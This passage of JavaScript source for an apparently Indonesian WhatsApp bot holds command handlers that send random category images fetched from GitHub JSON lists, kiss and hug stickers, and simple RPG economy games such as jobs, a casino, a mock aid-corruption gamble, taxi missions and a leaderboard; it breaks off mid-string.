case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
qioreply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
qio.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
//=================================================//
case 'kiss': {
if (m.mentionedJid[0] === m.sender) return m.reply(`gabisa bego`)
if (!m.mentionedJid[0]) return m.reply(`Contoh : ${prefix}kiss @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await qio.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await qio.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Mencium @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'hug': {
if (m.mentionedJid[0] === m.sender) return m.reply(`gabisa bego`)
if (!m.mentionedJid[0]) return m.reply(`Contoh : ${prefix}hug @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await qio.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await qio.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Memeluk @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'nebang': {
if (!isGroup) return qioreply(mess.ingroup)
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastparming + 1800000
if (new Date - user.lastparming < 1800000) return m.reply(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
let wood = `${Math.floor(Math.random() * 50)}`.trim()
let money = `${Math.floor(Math.random() * 50000)}`.trim()
user.wood += wood * 1
user.money += money * 1
user.lastparming = new Date * 1
m.reply(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=================================================//
case 'casino': {
if (!isGroup) return qioreply(mess.ingroup)
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
let buatall = 1
qio.casino = qio.casino ? qio.casino : {}
if (m.chat in qio.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else qio.casino[m.chat] = true
try {
let randomaku = `${Math.floor(Math.random() * 101)}`.trim()
let randomkamu = `${Math.floor(Math.random() * 81)}`.trim() //hehe Biar Susah Menang :v
let Aku = (randomaku * 1)
let Kamu = (randomkamu * 1)
let count = args[0]
count = count ? /all/i.test(count) ? Math.floor(db.data.users[m.sender].exp / buatall) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
count = Math.max(1, count)
if (args.length < 1) return qioreply('casino <jumlah>\n ' + 'casino 1000', )
if (db.data.users[m.sender].exp >= count * 1) {
db.data.users[m.sender].exp -= count * 1
//await qioreply('') //Kwkwwkkwlwlw
if (Aku > Kamu) {
m.reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You LOSE*\nKamu kehilangan ${count} Uang(xp)`)
} else if (Aku < Kamu) {
db.data.users[m.sender].exp += count * 2
m.reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*You Win*\nKamu mendapatkan ${count * 2} Uang(xp)`)
} else {
db.data.users[m.sender].exp += count * 1
m.reply(`💰 Casino 💰\n*Kamu:* ${Kamu} Point\n*Computer:* ${Aku} Point\n\n*SERI*\nKamu mendapatkan ${count * 1} Uang(xp)`)
}
} else m.reply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
} catch (e) {
console.log(e)
qioreply('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != qio.user.jid)) {
qio.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete qio.casino[m.chat]
}
}
break
//=================================================//
case 'kerja':
case 'bekerja': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let type = (args[0] || '').toLowerCase()
let users = db.data.users[m.sender]
let time = users.lastkerja + 30000
let __timers = (new Date - users.lastkerja)
let _timers = (1000 - __timers)
let timers = clockString(_timers)

let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
let penumpang = penumpan[Math.floor(Math.random() * penumpan.length)]

let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
let dagangan = daganga[Math.floor(Math.random() * daganga.length)]

let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
let pasien = pasie[Math.floor(Math.random() * pasie.length)]

let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
let panen = pane[Math.floor(Math.random() * pane.length)]

let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
let bengkel = bengke[Math.floor(Math.random() * bengke.length)]

let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
let rumah = ruma[Math.floor(Math.random() * ruma.length)]

if (/kerja/i.test(command)) {
switch (type) {
case 'ojek':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
let hasilojek = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilojek * 1
users.lastparming = new Date * 1
m.reply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} ${global.rpg.emoticon('money')}*`)
break
//=================================================//
case 'pedagang':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildagang = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildagang * 1
users.lastparming = new Date * 1
m.reply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} ${global.rpg.emoticon('money')}*`)
break
//=================================================//
case 'dokter':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasildokter = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasildokter * 1
users.lastparming = new Date * 1
m.reply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* ${global.rpg.emoticon('money')}`)
break
//=================================================//
case 'petani':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasiltani = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasiltani * 1
users.lastparming = new Date * 1
m.reply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} ${global.rpg.emoticon('money')}*`)
break
//=================================================//
case 'montir':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilmontir = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilmontir * 1
users.lastparming = new Date * 1
m.reply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan kamu mendapatkan uang senilai *Rp ${hasilmontir}* ${global.rpg.emoticon('money')}`)
break
//=================================================//
case 'kuli':
if (new Date - users.lastkerja < 300000) return m.reply(`Kamu sudah bekerja,Saatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
let hasilkuli = `${Math.floor(Math.random() * 150000)}`.trim()
users.money += hasilkuli * 1
users.lastparming = new Date * 1
m.reply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
default:
return m.reply(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
}
}
}
break
//=================================================//
case 'bankcek': {
if (!isGroup) return qioreply(mess.ingroup)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? qio.user.jid: m.sender
if (!(who in db.data.users)) return m.m.reply(`User ${who} not in database`)
let user = db.data.users[who]
let isMods = global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number).map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.ownerTime < 0
let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: qio.getName(m.sender)}
│ ${global.rpg.emoticon('atm')} Atm: ${user.atm > 0 ? 'Level ' + user.atm: '✖️'}
│ ${global.rpg.emoticon('bank')} Bank: ${user.bank} / ${user.fullatm}
│ ${global.rpg.emoticon('money')} Money: ${user.money}
│ ${global.rpg.emoticon('chip')} Chip: ${user.chip}
│ 🤖 Robo: ${user.robo > 0 ? 'Level ' + user.robo: '✖️'}
│ 🌟 Status: ${isMods ? 'Developer' : isDeveloper ? 'Owner' : isPrems ? 'owner User ✅' : user.level > 999 ? 'Elite User' : 'Free User'}
│ 📑 Registered: ${user.registered ? 'Yes': 'No'}
└────···
`.trim()
m.reply(`${caption}`)
}
break
//=================================================//
case 'bansos': {
if (!isGroup) return qioreply(mess.ingroup)
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)];
}

function clockString(ms) {
let h = Math.floor(ms / 3600000);
let m = Math.floor(ms / 60000) % 60;
let s = Math.floor(ms / 1000) % 60;
return [h, m, s].map(v => v.toString().padStart(2, '0')).join(':');
}

let user = db.data.users[m.sender];
let randomaku = Math.floor(Math.random() * 101);
let randomkamu = Math.floor(Math.random() * 101);
let __timers = new Date() - user.lastbansos;
let _timers = 360 - __timers;
let timers = clockString(_timers);

if (user.money < 1000) {
return m.reply(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
}

if (new Date() - user.lastbansos > 300000) {
if (randomaku > randomkamu) {
user.money -= 3000000;
user.lastbansos = new Date() * 1;
return qio.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/afcf9a7f4e713591080b5.jpg' },
caption: `Kamu Tertangkap Setelah Kamu korupsi dana bansos🕴️💰,Dan Kamu harus membayar denda 3 Juta rupiah💵`
});
} else if (randomaku < randomkamu) {
user.money += 3000000;
user.lastbansos = new Date() * 1;
return qio.sendMessage(m.chat, {
image: { url: 'https://telegra.ph/file/d31fcc46b09ce7bf236a7.jpg' },
caption: `Kamu berhasil korupsi dana bansos🕴️💰,Dan Kamu mendapatkan 3 Juta rupiah💵`
});
} else {
user.lastbansos = new Date() * 1;
return m.reply(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
}
} else {
return m.reply(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
}
}
break;


case 'taxy': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
qio.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
m.reply(`Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - user.lastmisi > 3600000) {
let randomaku1 = Math.floor(Math.random() * 1000000)
let randomaku2 = Math.floor(Math.random() * 10000)

var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚕


✔️ Mendapatkan orderan....
`.trim()

var dimas2 = `
🚶⬛⬛⬛⬛⬛🚐⬛⬛⬛🚓🚚
🚖⬜⬜⬜⬛⬜⬜⬜🚓⬛🚑
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚙
🏘️🏘️🏢️🌳🌳 🏘️🏘️🏡


🚖 Mengantar Ke tujuan.....
`.trim()

var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛🚓
⬛⬜🚗⬜⬜⬛⬜🚐⬜⬜⬛🚙🚚🚑
⬛⬛⬛⬛🚒⬛⬛⬛⬛⬛⬛🚚
🏘️🏘️🏘️🏘️🌳🌳 🏘️


🚖 Selesai Mengantar Pelanggan....
`.trim()

var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Taxy ${name} ]—*
➕ 💹 Uang = [ ${randomaku1} ]
➕ ✨ Exp = [ ${randomaku2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += randomaku1
user.exp += randomaku2
user.ojekk += 1

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]

setTimeout(() => {
m.reply(`${hsl}`)
}, 27000)

setTimeout(() => {
m.reply(`${dimas4}`)
}, 25000)

setTimeout(() => {
m.reply(`${dimas3}`)
}, 20000)

setTimeout(() => {
m.reply(`${dimas2}`)
}, 15000)

setTimeout(() => {
m.reply(`${dimas}`)
}, 10000)

setTimeout(() => {
qioreply('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'leaderboard': {
if (!isGroup) return qioreply(mess.ingroup)
const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}
const { areJidsSameUser } = require ('@whiskeysockets/baileys')
function sort(property, ascending = true) {
if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
if (property) return (a, i, b) => {
return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
}
else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
return a.jid
}


/**
 * Detect Number
 * @param {Number} x 
 */
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}
const leaderboards = [
'level',
'exp',
'limit',
'money',
'iron',
'gold',
'diamond',
'emerald',
'trash',
'joinlimit',
'potion',
'petFood',
'wood',
'rock',
'string',
'common',
'uncommon',
'mythic',
'legendary',
'pet',
'bank',
'chip',
'skata'
]
let users = Object.entries(db.data.users).map(([key, value]) => {
return {
...value, jid: key
}
})
let imgr = getRandom()
let leaderboard = leaderboards.filter(v => v && users.filter(user => user && user[v]).length)
let type = (args[0] || '').toLowerCase()
const getPage = (item) => Math.ceil((users.filter(user => user && user[item]).length) / 0)
let wrong = `🔖 ᴛʏᴩᴇ ʟɪsᴛ :
${leaderboard.map(v => `
⮕ ${rpg.emoticon(v)} - ${v}
`.trim()).join('\n')}
––––––––––––––––––––––––
💁🏻‍♂ ᴛɪᴩ :
